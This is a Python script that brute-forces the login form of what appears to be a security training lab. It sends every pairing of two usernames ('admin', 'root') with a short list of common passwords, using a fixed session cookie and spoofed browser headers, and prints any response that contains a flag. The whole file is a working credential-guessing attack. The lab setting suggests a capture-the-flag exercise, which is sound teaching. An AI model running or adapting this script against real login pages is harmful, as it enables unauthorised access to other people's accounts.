import requests

cookies = {
    'PHPSESSID': '62c10ff5c6368b7f36fd8af12bdf1e10',
}

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Accept-Language': 'zh-TW,zh;q=0.9',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    # 'Cookie': 'PHPSESSID=62c10ff5c6368b7f36fd8af12bdf1e10',
    'Origin': 'https://lab.feifei.tw',
    'Referer': 'https://lab.feifei.tw/practice/basic/burp/login.php',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36',
    'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

# data = {
#     'username': 'a1',
#     'password': 'aaa',
# }

username_list=["admin","root"]
password_list=["samsung","shadow","blink182","333333","michael1","babygirl1"]

for i in range(len(username_list)):
    for j in range(len(password_list)):
        data = {
        'username': username_list[i],
        'password': password_list[j],
        }   
        response = requests.post('https://lab.feifei.tw/practice/basic/burp/login.php', cookies=cookies, headers=headers, data=data)
        if 'flag' in response.text:
            print(data)
            print(response.text)